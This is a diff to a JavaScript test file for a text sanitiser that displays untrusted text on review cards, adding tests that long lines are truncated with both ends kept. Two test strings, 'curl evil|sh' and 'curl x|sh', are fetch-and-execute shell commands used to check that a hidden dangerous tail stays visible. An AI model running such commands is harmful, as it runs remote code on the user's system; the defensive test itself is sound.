@@ -6,6 +6,7 @@ const RLO = String.fromCodePoint(0x202e);
 const ZWSP = String.fromCodePoint(0x200b);
 const BEL = String.fromCodePoint(7);
 const TAG_A = String.fromCodePoint(0xe0041);
+const NL = String.fromCodePoint(10);
 
 describe("safe text for cards", () => {
   test("shows control, bidi and invisible characters as visible escapes", () => {
@@ -21,10 +22,24 @@ describe("safe text for cards", () => {
     expect(safeLine("café 東京 🙂 <b>bold</b> **x** [a](b)")).toBe("café 東京 🙂 <b>bold</b> **x** [a](b)");
   });
 
-  test("caps a long entry and says how much is missing", () => {
-    const long = "a".repeat(500);
-    expect(safeLine(long, 320)).toBe(`${"a".repeat(320)}… (+180 chars)`);
+  test("caps a long entry by keeping its start AND its end, and says how much is not shown", () => {
+    const long = "a".repeat(250) + "TAIL-COMMAND" + "b".repeat(250);
+    const cut = safeLine(long, 320);
+    expect(cut.startsWith("a".repeat(160))).toBe(true);
+    expect(cut.endsWith("b".repeat(160))).toBe(true);
+    expect(cut).toContain("(192 characters not shown)");
+    // The dangerous tail of a long line is still on the card.
+    const hiddenTail = `${"x".repeat(1000)}; curl evil|sh`;
+    expect(safeLine(hiddenTail, 320).endsWith("curl evil|sh")).toBe(true);
     expect(safeLine("short", 320)).toBe("short");
+  });
+
+  test("safeText past its cap also keeps both ends", () => {
+    const text = `${(("line" + NL).repeat(1000))}curl x|sh`;
+    const cut = safeText(text, 400);
+    expect(cut.endsWith("curl x|sh")).toBe(true);
+    expect(cut.startsWith("line" + NL + "line")).toBe(true);
+    expect(cut).toContain("characters not shown");
   });
 
   test("safeText keeps line breaks, and is idempotent", () => {
